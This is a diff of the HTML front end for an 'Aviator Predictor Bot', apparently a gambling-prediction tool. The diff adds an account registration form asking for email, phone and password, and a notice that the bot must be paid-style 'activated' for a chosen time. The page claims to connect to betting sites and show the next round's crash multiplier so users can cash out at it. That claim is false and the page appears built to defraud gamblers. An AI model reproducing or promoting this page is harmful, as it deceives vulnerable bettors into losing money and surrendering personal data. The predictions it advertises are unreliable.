@@ -191,11 +191,27 @@
             <input class="bot-input" type="password" name="password" placeholder="Password" required><br>
             <button class="bot-btn" type="submit">Login</button>
         </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="#" id="registerLink" style="color: #4CAF50; text-decoration: none; font-size: 14px;">Don't have an account? Register here</a>
+        </div>
+    </div>
+    <div class="bot-center hidden" id="bot-register">
+        <h2>Register New Account</h2>
+        <form id="registerForm">
+            <input class="bot-input" type="email" name="email" placeholder="Email Address" required><br>
+            <input class="bot-input" type="tel" name="phone" placeholder="Phone Number" required><br>
+            <input class="bot-input" type="password" name="password" placeholder="Create Password" required><br>
+            <input class="bot-input" type="password" name="confirmPassword" placeholder="Confirm Password" required><br>
+            <button class="bot-btn" type="submit">Register</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="#" id="loginLink" style="color: #4CAF50; text-decoration: none; font-size: 14px;">Already have an account? Login here</a>
+        </div>
     </div>
     <div class="hidden" id="bot-main">
         <div class="hidden" id="bot-server-loading" style="width:100vw;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:radial-gradient(ellipse at center, #2c2d35 0%, #1a1b21 50%, #0f1014 100%);">
             <h2 style="color:#f1c40f;">Loading Bot Server...</h2>
-            <p style="margin-top:12px;">Please wait while we connect you to the Aviator Predictor Bot server.</p>
+            <p style="margin-top:12px;">Please wait while we connect you to the Aviator Game Predictor Bot server.</p>
             <div style="margin:32px 0;"><i class="fas fa-server fa-3x" style="color:#e74c3c;"></i></div>
         </div>
         <div class="hidden bot-server" id="bot-server-main">
@@ -223,8 +239,9 @@
                     <li>Select your betting site from the options.</li>
                     <li>Wait for Bot to Connect to your betting site.</li>
                     <li>Click “Predict” then see the “Next Round Prediction”.</li>
-                    <li>Place your bet in your betting app and cash out at the shown multiplier.</li>
+                    <li>Place your bet in your betting app and cash out at the shown multiplier on the bot showing when the plane flies away.</li>
                 </ol>
+                <p>You have to Activate the bot to use it for the time you choose.</p>
             </div>
             <div class="hidden" id="siteSelect">
                 <div style="font-size:1.1em;margin-bottom:8px;">Select Betting Site:</div>
@@ -243,8 +260,8 @@
                     <button class="site-btn" data-site="MelBet"><img src="data:image/png;base64,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" alt="MelBet" style="height:32px;vertical-align:middle;"> MelBet</button>
                     <button class="site-btn" data-site="OdiBets"><img src="data:image/jpeg;base64,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" alt="Odibets" style="height:32px;vertical-align:middle;"> Odibets</button>
                     <button class="site-btn" data-site="HollywoodBets"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQqssActVFVlPDVR6NL1iZGNQn8wzDN1Kcsyg&s" alt="HollywoodBets" style="height:32px;vertical-align:middle;"> HollywoodBets</button>
-                    <button class="site-btn" data-site="SportPesa"><img src="data:image/jpeg;base64,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" alt="SportPesa" style="height:32px;vertical-align:middle;background-color:#e50914;width:32px;border-radius:4px;"> SportPesa</button>
-                </div>
